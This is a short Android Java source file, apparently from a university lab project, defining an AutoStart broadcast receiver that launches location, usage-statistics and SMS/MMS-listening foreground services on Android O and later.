package uk.ac.rgu.lab04.honours;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class AutoStart extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(new Intent(context,LocationService.class));
            context.startForegroundService(new Intent(context,UsageStatService.class));
            context.startForegroundService(new Intent(context,ListenSmsMmsService.class));
        }
    }
}
